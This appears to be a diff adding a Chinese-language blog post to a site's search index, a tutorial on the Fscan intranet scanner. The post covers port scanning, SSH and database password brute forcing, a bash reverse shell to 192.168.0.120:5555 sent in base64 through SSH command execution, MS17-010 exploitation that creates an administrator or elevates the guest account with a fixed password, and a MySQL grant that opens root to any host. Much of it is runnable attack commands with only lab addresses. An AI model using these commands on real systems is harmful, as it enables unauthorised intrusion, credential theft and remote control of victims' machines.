@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>内网扫描器Fscan</title>
+      <link href="/2023/05/23/%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F%E5%99%A8Fscan/"/>
+      <url>/2023/05/23/%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F%E5%99%A8Fscan/</url>
+      
+        <content type="html"><![CDATA[<h1>简介</h1><blockquote><ul><li>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。</li><li>支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。</li></ul></blockquote><h1>主要功能</h1><h2 id="1-信息搜集">1.信息搜集</h2><ul><li>存活探测(icmp)</li><li>端口扫描</li></ul><h2 id="2-爆破功能">2.爆破功能:</h2><ul><li>各类服务爆破(ssh、smb、rdp等)</li><li>数据库密码爆破(mysql、mssql、redis、psql、oracle等)</li></ul><h2 id="3-系统信息、漏洞扫描">3.系统信息、漏洞扫描</h2><ul><li>netbios探测、域控识别</li><li>获取目标网卡信息</li><li>高危漏洞扫描(ms17010等)</li></ul><h2 id="4-Web探测功能">4.Web探测功能:</h2><ul><li>webtitle探测</li><li>web指纹识别(常见cms、oa框架等)</li><li>web漏洞扫描(weblogic、st2等,支持xray的poc)</li></ul><h2 id="5-漏洞利用">5.漏洞利用:</h2><ul><li>redis写公钥或写计划任务</li><li>ssh命令执行</li><li>ms17017利用(植入shellcode),如添加用户等</li></ul><h2 id="6-其他功能">6.其他功能:</h2><ul><li>文件保存</li></ul><h1>使用方法</h1><h2 id="完整参数"><strong>完整参数</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-c string      #ssh命令执行  <br>-cookie string  #设置cookie  <br>-debug int     #多久没响应,就打印当前进度(default 60)  <br>-domain string    #smb爆破模块时,设置域名  <br>-h string          #目标ip: 192.168.11.11 | 192.168.11.11-255 |192.168.11.11,192.168.11.12  <br>-hf string        #读取文件中的目标  <br>-hn string        #扫描时,要跳过的ip: -hn 192.168.1.1/24  -m string         #设置扫描模式: <br>-m ssh (default &quot;all&quot;)  <br>-no            #扫描结果不保存到文件中  <br>-nobr            #跳过sql、ftp、ssh等的密码爆破  <br>-nopoc          #跳过web poc扫描  <br>-np            #跳过存活探测  <br>-num int         #web poc 发包速率  (default 20)  <br>-o string          #扫描结果保存到哪 (default &quot;result.txt&quot;) <br>-p string          #设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default &quot;21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017&quot;)  <br>-pa string        #新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)  <br>-path string      #fcgi、smb romote file path  <br>-ping            #使用ping代替icmp进行存活探测  <br>-pn string        #扫描时要跳过的端口,as: -pn 445  <br>-pocname string   #指定web poc的模糊名字, -pocname weblogic <br>-proxy string     #设置代理, -proxy http://127.0.0.1:8080  <br>-user string      #指定爆破时的用户名  <br>-userf string     #指定爆破时的用户名文件  <br>-pwd string       #指定爆破时的密码  <br>-pwdf string      # 指定爆破时的密码文件  <br>-rf string        #指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)  <br>-rs string         #redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)  <br>-silent          #静默扫描,适合cs扫描时不回显  <br>-sshkey string    #ssh连接时,指定ssh私钥  <br>-t int          #扫描线程 (default 600)  <br>-time int          #端口扫描超时时间 (default 3)  <br>-u string          #指定Url扫描  <br>-uf string        #指定Url文件扫描  <br>-wt int          #web访问超时时间 (default 5)  <br>-pocpath string  #指定poc路径  <br>-usera string   #在原有用户字典基础上,新增新用户  <br>-pwda string    #在原有密码字典基础上,增加新密码  <br>-socks5       #指定socks5代理 (as: -socks5  socks5://127.0.0.1:1080)  <br>-sc         #指定ms17010利用模块shellcode,内置添加用户等功能 (as: -sc add)<br></code></pre></td></tr></table></figure><h2 id="简单使用"><strong>简单使用</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">fscan.exe -h [IP] #默认使用全部模块fscan.exe -h 192.168.1.1/16 #扫描B段fscan.exe -h 192.168.x.x -h 192.168.1.1/24 //C段fscan.exe -h 192.168.x.x -h 192.168.1.1/16 //B段fscan.exe -h 192.168.x.x -h 192.168.1.1/8  //A段的192.x.x.1和192.x.x.254,方便快速查看网段信息<br></code></pre></td></tr></table></figure><p><img src="/2023/05/23/%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F%E5%99%A8Fscan/image-20230523092542013.png" alt="image-20230523092542013"></p><p><strong>加上netbios模块才会显示netbios的信息</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h 192.168.88.141 -m netbios<br></code></pre></td></tr></table></figure><h3 id="以文件进行导入扫描">以文件进行导入扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -hf “路径”<br>.\fscan64.exe -hf .\ip.txt<br>\#可以使用相对位置，也可以使用绝对位置<br></code></pre></td></tr></table></figure><h3 id="跳过相应IP进行扫描">跳过相应IP进行扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h 192.168.88.1/24<br></code></pre></td></tr></table></figure><h3 id="对url进行扫描">对url进行扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -u http://baidu.com<br># -uf 对指定文件内的URL进行扫描<br></code></pre></td></tr></table></figure><h3 id="设置代理扫描">设置代理扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h 192.168.88.1/24  -proxy http://127.0.0.1:8080<br></code></pre></td></tr></table></figure><h1>爆破功能</h1><h2 id="爆破使用">爆破使用</h2><p>爆破功能简单使用的话直接使用即可默认调用，输入如下命令它会自动爆破扫描出来的服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h IP<br></code></pre></td></tr></table></figure><h2 id="对模块进行自定义文件爆破">对模块进行自定义文件爆破</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h [IP] -m [模块] -p [模块对应的端口] -pwdf [密码文件] -userf [用户名文件]<br></code></pre></td></tr></table></figure><p>-m的模块包含：</p><ul><li>[mssql] [ms17010] [all] [portscan] [ftp] [smb] [netbios] [oracle] [redis]</li><li>[fcgi] [mem] [web] [ssh] [findnet] [icmp] [main] [rdp] [mgo] [cve20200796]</li><li>[webonly] [mysql] [psql]</li></ul><p>对ssh模块进行爆破，并设置自定义文件爆破：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h IP -m ssh -p 22 -pwdf .\pwd.txt -userf .\users.txt<br></code></pre></td></tr></table></figure><p>-pwdf 、-userf 同样也是相对位置和绝对位置都可以使用。</p><p>注：在进行爆破的时候是按文件里面的顺序进行爆破的，这时ssh包含多个用户，只能爆破出来第一个，要把root类的管理权限高的用户名放在文本得最上面。</p><p>附加一个扫mysql服务的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h IP -m mysql -np -nopoc<br></code></pre></td></tr></table></figure><p><img src="/2023/05/23/%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F%E5%99%A8Fscan/image-20230523093704209.png" alt="image-20230523093704209"></p><p>使用navicat连接</p><p>连接的前提：你目标机要开启远程连接，</p><p>mysql开启远程连接：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">grant all privileges on *.* to &#x27;root&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27; with grant option;#开启一个远程连接用户为root任意IP可以连接，密码时123456<br>flush privileges;#刷新用户权限<br>select user,host from user;#查看用户检查是否已经更改<br></code></pre></td></tr></table></figure><h2 id="跳过一些扫描进行爆破">跳过一些扫描进行爆破</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-nobr #跳过sql、ftp、ssh等爆破<br>-nopoc #跳过web poc扫描<br>-np #跳过存活检测<br></code></pre></td></tr></table></figure><h1>漏洞利用功能</h1><h2 id="使用ssh命令执行">使用ssh命令执行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h [目标IP] -c [执行的命令]<br></code></pre></td></tr></table></figure><p>例如：</p><p>查看用户：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h IP -c whoami<br></code></pre></td></tr></table></figure><h2 id="ssh命令执行上线Necat">ssh命令执行上线Necat</h2><p>例如：</p><p>执行的命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">bash -i &gt;&amp; /dev/tcp/192.168.0.120/5555 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>编码后执行的命令（因为在powershell中执行的命令不能包含&amp;&amp;和&amp;）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h 192.168.88.130  -c &quot;bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTIwLzU1NTUgMD4mMQo=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;<br></code></pre></td></tr></table></figure><p>注：<strong>若命令有变</strong>只需要<strong>将变化后执行的命令</strong>进行base64编码后，对上述<strong>编码后执行的命令</strong>中的base64编码进行替换即可。</p><h2 id="MS17-010模块利用">MS17-010模块利用</h2><p>添加用户：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h 192.168.88.141 -m ms17010 -sc add<br></code></pre></td></tr></table></figure><p>执行此命令后会生成一个用户，用户名：sysadmin 密码：1qaz@WSX!@#4</p><p>启用guest用户，并把guest用户添加到管理员组</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h 192.168.88.141 -m ms17010 -sc guest<br>#启用后用户是guest 密码：1qaz@WSX!@#4<br></code></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
+            
+            <tag> 命令 </tag>
+            
+            <tag> 内网 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CVE-2023-21839 weblogicRCE漏洞复现</title>
       <link href="/2023/04/19/CVE-2023-21839-weblogicRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
       <url>/2023/04/19/CVE-2023-21839-weblogicRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
@@ -287,9 +316,9 @@
       
         <tags>
             
-            <tag> 命令 </tag>
-            
             <tag> 渗透 </tag>
+            
+            <tag> 命令 </tag>
             
         </tags>
       
